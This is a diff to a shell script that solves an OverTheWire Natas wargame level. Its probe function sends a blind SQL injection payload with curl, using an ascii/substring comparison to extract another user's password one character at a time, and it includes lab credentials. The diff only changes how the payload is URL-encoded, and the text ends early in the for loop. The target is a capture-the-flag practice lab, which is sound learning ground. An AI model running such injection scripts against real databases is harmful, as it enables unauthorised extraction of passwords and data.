@@ -1,7 +1,7 @@
 #!/bin/sh
 
 probe () {
-    curl -su natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J "http://natas15.natas.labs.overthewire.org/index.php?username=%22%20or%20ascii(substring((SELECT%20password%20from%20users%20where%20username=%22natas16%22),$1,1))=$2%20and%20username%20=%20%22natas16" | grep -q "doesn't"
+    curl -su natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J "http://natas15.natas.labs.overthewire.org/index.php?username=\"+or+ascii(substring((select+password+from+users+where+username=\"natas16\"),$1,1))=$2+and+\"1\"=\"1" | grep -q "doesn't"
 }
 
 for i in $(seq 1 32); do
